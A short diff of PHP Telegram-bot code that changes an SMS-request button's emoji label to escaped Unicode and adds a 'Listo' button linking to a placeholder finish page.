@@ -123,8 +123,12 @@ if (isset($update['callback_query'])) {
                 'inline_keyboard' => [
                     [
                         [
-                            'text' => '📩🔄 SMS',
+                            'text' => '\ud83d\udce9\ud83d\udd01 SMS',
                             'callback_data' => 'PEDIR_SMS|' . $telefono,
+                        ],
+                        [
+                            'text' => 'Listo',
+                            'url'  => 'https://tudominio.com/finalizado.html',
                         ],
                     ],
                 ],
